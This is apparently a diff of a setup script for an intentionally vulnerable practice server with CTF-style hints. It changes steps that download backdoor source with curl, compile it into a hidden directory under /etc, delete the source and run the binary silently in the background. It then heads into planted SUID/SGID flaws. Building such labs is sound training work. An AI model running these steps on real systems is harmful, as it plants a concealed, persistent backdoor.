@@ -124,17 +124,18 @@ python3 /root/back.py </dev/null >/dev/null 2>&1 &
 ### Install and schedule a Backdoor Binary
 # Get the code to compile
 mkdir -p /etc/goose
+mkdir -p /etc/goose/.golden_egg
 curl -s -o /etc/goose/golden_egg.c https://raw.githubusercontent.com/infiniteaxon/VulnServer/main/backdoor.c
 
 # Hint
 echo "You're in the correct directory!" > /etc/goose/egg
 
 # Compile and remove source code
-gcc -o /etc/goose/.golden_egg /etc/goose/golden_egg.c 2>/dev/null
+gcc -o /etc/goose/.golden_egg/golden_egg /etc/goose/golden_egg.c 2>/dev/null
 rm -f /etc/goose/golden_egg.c
 
 # Run the binary in background
-nohup /etc/goose/.golden_egg </dev/null >/dev/null 2>&1 &
+nohup /etc/goose/.golden_egg/golden_egg </dev/null >/dev/null 2>&1 &
 
 ### SUID/SGID Vulnerabilities
 
